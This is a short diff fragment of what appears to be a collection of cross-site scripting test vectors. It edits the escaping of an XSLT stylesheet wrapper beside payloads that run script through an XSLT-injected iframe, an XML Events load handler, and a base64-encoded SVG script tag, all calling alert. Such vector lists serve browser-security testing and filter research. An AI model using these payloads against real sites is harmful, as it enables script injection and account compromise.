@@ -46,12 +46,12 @@ PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3Nj
             &lt;svg:circle cx="0.45" cy="0.7" r="0.075" fill="white" /&gt;
         &lt;/svg:mask&gt;
     &lt;/svg:svg&gt;
-    <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+    &lt;xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
         <xsl:template match="/">
             &lt;iframe xmlns="http://www.w3.org/1999/xhtml" src="(125)"&gt;
             &lt;/iframe&gt;
         </xsl:template>
-    </xsl:stylesheet>
+    &lt;/xsl:stylesheet&gt;
     <circle fill="red" r="40"></circle>
     <listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x" />
     <handler id="y">alert&#40;127&#41;</handler>
